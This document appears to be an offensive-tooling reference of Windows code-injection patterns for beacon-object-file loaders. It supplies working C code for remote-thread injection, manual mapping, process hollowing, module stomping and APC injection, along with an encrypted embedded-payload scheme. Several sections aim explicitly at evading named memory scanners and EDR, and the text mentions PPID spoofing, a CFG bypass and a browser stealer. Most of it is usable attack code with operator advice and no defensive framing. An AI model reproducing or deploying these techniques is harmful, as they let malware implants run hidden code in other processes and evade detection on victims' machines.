# Injection patterns (generic BOF)

These patterns are framework-agnostic and suitable for BOF-compatible COFF loaders.
All code uses DFR convention (`MODULE$Function`) and heap-only allocation.

## 1) Remote thread baseline

Flow:
1. Open target process with minimum required rights
2. `VirtualAllocEx` as `PAGE_READWRITE`
3. `WriteProcessMemory`
4. `VirtualProtectEx` to `PAGE_EXECUTE_READ`
5. Trigger execution (`CreateRemoteThread`, APC, or context switch)

Key rule: avoid persistent RWX pages.

```c
/* ── DFR ──────────────────────────────────────────────── */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);

static BOOL inject_remote_thread(DWORD pid, BYTE* payload, SIZE_T payloadSize) {
    HANDLE hProc = KERNEL32$OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProc) return FALSE;

    LPVOID remoteBuf = KERNEL32$VirtualAllocEx(hProc, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuf) { KERNEL32$CloseHandle(hProc); return FALSE; }

    KERNEL32$WriteProcessMemory(hProc, remoteBuf, payload, payloadSize, NULL);

    DWORD oldProt;
    KERNEL32$VirtualProtectEx(hProc, remoteBuf, payloadSize, PAGE_EXECUTE_READ, &oldProt);

    KERNEL32$CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);

    KERNEL32$CloseHandle(hProc);
    return TRUE;
}
```

## 2) Manual mapping

Use when you need loader-like behavior without `LoadLibrary`:

1. Validate PE headers (DOS magic, NT signature, x64 machine)
2. Map headers + sections locally
3. Apply relocations if remote base differs from preferred
4. Resolve imports in remote context via `LoadLibraryA` + `GetProcAddress`
5. Write mapped image to remote process
6. Execute DllMain via shellcode stub or thread context

Pitfall: large helper code can bloat `.text`; split helpers and strip aggressively.

```c
/* ── Relocation helper ────────────────────────────────── */
static void ApplyRelocations(BYTE* imageBase, ULONGLONG delta,
                             IMAGE_NT_HEADERS64* ntHeaders) {
    IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.VirtualAddress == 0 || relocDir.Size == 0) return;

    IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(imageBase + relocDir.VirtualAddress);
    BYTE* relocEnd = (BYTE*)reloc + relocDir.Size;

    while ((BYTE*)reloc < relocEnd && reloc->SizeOfBlock > 0) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < count; i++) {
            WORD type = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* addr = (ULONGLONG*)(imageBase + reloc->VirtualAddress + offset);
                *addr += delta;
            }
        }
        reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
    }
}
```

## 3) Process hollowing

Typical sequence:
- spawn suspended host process (with PPID spoof + CFG bypass)
- inspect remote PEB/image base via `NtQueryInformationProcess`
- allocate/relocate replacement image at preferred or arbitrary base
- write headers + sections
- update entrypoint via `SetThreadContext` (RIP register)
- resume thread

Operational quality checks:
- architecture parity (x64→x64)
- robust rollback on partial failure
- optional PPID spoof + mitigation attributes

```c
/* ── PEB read helper ──────────────────────────────────── */
#define PEB_IMAGE_BASE_OFFSET 0x10

typedef struct _PROCESS_BASIC_INFORMATION_BOF {
    LONG      ExitStatus;
    PVOID     PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG      BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION_BOF;

typedef LONG (NTAPI *pfnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

static BOOL ReadRemotePEBImageBase(HANDLE hProcess, PVOID pebAddr, ULONGLONG* pImageBase) {
    BYTE pebBuf[0x40];
    SIZE_T bytesRead = 0;
    if (!KERNEL32$ReadProcessMemory(hProcess, pebAddr, pebBuf, sizeof(pebBuf), &bytesRead))
        return FALSE;
    if (bytesRead < PEB_IMAGE_BASE_OFFSET + sizeof(ULONGLONG))
        return FALSE;
    *pImageBase = *(ULONGLONG*)(pebBuf + PEB_IMAGE_BASE_OFFSET);
    return TRUE;
}
```

## 4) Module stomping (image-backed execution)

Goal: avoid unbacked executable regions. Memory appears as backed by a
legitimate on-disk DLL, defeating scanners that flag private RX pages
(Moneta, MalMemDetect, Hunt-Sleeping-Beacons).

High-level flow:
1. Find a sacrificial DLL not loaded in target process
2. `NtCreateSection` with `SEC_IMAGE` from that DLL
3. `NtMapViewOfSection` in target process → image-backed memory
4. Overwrite `.text` section with payload
5. Transfer execution to stomped region

```c
/* ── NTDLL section mapping typedefs ───────────────────── */
typedef LONG (NTAPI *pfnNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef LONG (NTAPI *pfnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef LONG (NTAPI *pfnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef LONG (NTAPI *pfnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

/* ── Additional KERNEL32 DFR for stomping ─────────────── */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);

/* ── Find sacrificial DLL ─────────────────────────────── */
static BOOL FindSacrificialDll(DWORD remotePid, SIZE_T requiredTextSize, wchar_t* outPath) {
    wchar_t sysDir[MAX_PATH * 2];
    wchar_t searchPath[MAX_PATH * 2];
    KERNEL32$GetSystemDirectoryW(sysDir, MAX_PATH * 2);
    MSVCRT$_snwprintf(searchPath, MAX_PATH * 2, L"%s\\*.dll", sysDir);

    WIN32_FIND_DATAW wfd;
    HANDLE hFind = KERNEL32$FindFirstFileW(searchPath, &wfd);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;

    BOOL found = FALSE;
    do {
        /* Skip if DLL already loaded in target */
        if (KERNEL32$GetModuleHandleW(wfd.cFileName)) continue;

        MSVCRT$_snwprintf(outPath, MAX_PATH * 2, L"%s\\%s", sysDir, wfd.cFileName);

        /* Read PE headers to check .text size */
        HANDLE hFile = KERNEL32$CreateFileW(outPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        IMAGE_DOS_HEADER dosH;
        DWORD bytesRead = 0;
        KERNEL32$ReadFile(hFile, &dosH, sizeof(dosH), &bytesRead, NULL);
        if (bytesRead < sizeof(dosH) || dosH.e_magic != IMAGE_DOS_SIGNATURE) {
            KERNEL32$CloseHandle(hFile); continue;
        }

        KERNEL32$SetFilePointer(hFile, dosH.e_lfanew, NULL, 0);
        IMAGE_NT_HEADERS64 ntH;
        KERNEL32$ReadFile(hFile, &ntH, sizeof(ntH), &bytesRead, NULL);
        KERNEL32$CloseHandle(hFile);

        if (bytesRead < sizeof(ntH) || ntH.Signature != IMAGE_NT_SIGNATURE) continue;

        IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(
            (BYTE*)&ntH.OptionalHeader + ntH.FileHeader.SizeOfOptionalHeader);
        for (int i = 0; i < ntH.FileHeader.NumberOfSections; i++) {
            if (sections[i].Name[0] == '.' && sections[i].Name[1] == 't' &&
                sections[i].Name[2] == 'e' && sections[i].Name[3] == 'x' &&
                sections[i].Name[4] == 't') {
                if ((SIZE_T)sections[i].Misc.VirtualSize >= requiredTextSize) {
                    found = TRUE;
                }
                break;
            }
        }
    } while (!found && KERNEL32$FindNextFileW(hFind, &wfd));

    KERNEL32$FindClose(hFind);
    return found;
}

/* ── Stomp and execute ────────────────────────────────── */
static BOOL StompAndExecute(HANDLE hProcess, DWORD pid, BYTE* payload, SIZE_T payloadSize) {
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    pfnNtCreateSection pNtCreateSection =
        (pfnNtCreateSection)KERNEL32$GetProcAddress(hNtdll, "NtCreateSection");
    pfnNtMapViewOfSection pNtMapViewOfSection =
        (pfnNtMapViewOfSection)KERNEL32$GetProcAddress(hNtdll, "NtMapViewOfSection");
    pfnNtProtectVirtualMemory pNtProtect =
        (pfnNtProtectVirtualMemory)KERNEL32$GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pfnNtWriteVirtualMemory pNtWrite =
        (pfnNtWriteVirtualMemory)KERNEL32$GetProcAddress(hNtdll, "NtWriteVirtualMemory");

    if (!pNtCreateSection || !pNtMapViewOfSection || !pNtProtect || !pNtWrite)
        return FALSE;

    /* 1. Find sacrificial DLL */
    wchar_t dllPath[MAX_PATH * 2];
    if (!FindSacrificialDll(pid, payloadSize, dllPath)) return FALSE;

    /* 2. Open the DLL file and create a section backed by it (SEC_IMAGE) */
    HANDLE hFile = KERNEL32$CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hSection = NULL;
    LONG st = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                               PAGE_READONLY, SEC_IMAGE, hFile);
    KERNEL32$CloseHandle(hFile);
    if (st != 0) return FALSE;

    /* 3. Map into target process as RW (will flip to RX after write) */
    PVOID baseAddr = NULL;
    SIZE_T viewSize = 0;
    st = pNtMapViewOfSection(hSection, hProcess, &baseAddr, 0, 0, NULL,
                             &viewSize, 1, 0, PAGE_READWRITE);
    KERNEL32$CloseHandle(hSection);
    if (st != 0) return FALSE;

    /* 4. Locate .text section in the mapped PE and overwrite with payload */
    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)baseAddr;
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    IMAGE_NT_HEADERS64* ntHdr = (IMAGE_NT_HEADERS64*)((BYTE*)baseAddr + dosHdr->e_lfanew);
    if (ntHdr->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)(
        (BYTE*)&ntHdr->OptionalHeader + ntHdr->FileHeader.SizeOfOptionalHeader);
    PVOID textAddr = NULL;
    SIZE_T textSize = 0;
    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (sec[i].Name[0] == '.' && sec[i].Name[1] == 't' &&
            sec[i].Name[2] == 'e' && sec[i].Name[3] == 'x' &&
            sec[i].Name[4] == 't') {
            textAddr = (BYTE*)baseAddr + sec[i].VirtualAddress;
            textSize = (SIZE_T)sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!textAddr || textSize < payloadSize) return FALSE;

    SIZE_T bytesWritten = 0;
    st = pNtWrite(hProcess, textAddr, payload, payloadSize, &bytesWritten);
    if (st != 0) return FALSE;

    /* 5. Restore protection to RX */
    PVOID protBase = textAddr;
    SIZE_T protSize = textSize;
    ULONG oldProt = 0;
    pNtProtect(hProcess, &protBase, &protSize, PAGE_EXECUTE_READ, &oldProt);

    /* 6. Create thread at stomped .text entry */
    KERNEL32$CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)textAddr, NULL, 0, NULL);
    return TRUE;
}
```

## 5) APC / context-based starts

Use when `CreateRemoteThread` is too noisy:

```c
/* ── APC injection on alertable thread ────────────────── */
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$QueueUserAPC(PAPCFUNC, HANDLE, ULONG_PTR);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Thread32First(HANDLE, LPTHREADENTRY32);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Thread32Next(HANDLE, LPTHREADENTRY32);

static BOOL InjectViaAPC(DWORD pid, LPVOID remoteBuf) {
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    int count = 0;

    if (KERNEL32$Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            HANDLE hThread = KERNEL32$OpenThread(
                THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
            if (hThread) {
                KERNEL32$QueueUserAPC((PAPCFUNC)remoteBuf, hThread, 0);
                KERNEL32$CloseHandle(hThread);
                count++;
            }
        } while (KERNEL32$Thread32Next(hSnap, &te));
    }
    KERNEL32$CloseHandle(hSnap);
    return count > 0;
}
```

Always validate target thread state and fallback cleanly.

## 6) Embedded encrypted payloads

Recommended chain:
- payload-to-header step during build (encrypt_payload tool)
- runtime decrypt in transient buffer
- execute
- securely zero key material and plaintext buffer where possible

```c
/* ── ChaCha20 inline decrypt (RFC 8439) ──────────────── */
/* Full implementation is ~80 lines; see Spectre coldwer or browser_stealer for reference */

static void secure_zero(void* ptr, size_t len) {
    volatile unsigned char* p = (volatile unsigned char*)ptr;
    while (len--) *p++ = 0;
}

/* Usage pattern:
 *   #include "payload.h"   // enc_payload[], enc_key[], enc_nonce[], enc_payload_len
 *   decrypt_chacha20(enc_key, enc_nonce, enc_payload, enc_payload_len);
 *   // ... use enc_payload ...
 *   secure_zero(enc_key, sizeof(enc_key));
 *   secure_zero(enc_nonce, sizeof(enc_nonce));
 */
```

Do not keep crypto keys in writable globals longer than required.
